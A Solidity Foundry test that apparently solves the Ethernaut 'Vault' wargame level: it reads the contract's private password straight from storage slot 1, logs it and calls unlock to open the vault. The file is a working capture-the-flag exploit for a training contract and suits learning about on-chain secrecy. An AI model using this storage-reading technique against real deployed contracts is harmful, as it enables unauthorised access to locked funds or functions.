// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Vault.sol";

contract VaultTest is Test {
    // Fill in the address of the vault
    Vault vault = Vault(vm.envAddress("VAULT"));

    function test() public {
        assertEq(vault.locked(), true);
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(password);

        vault.unlock(password);
        assertEq(vault.locked(), false);
    }
}
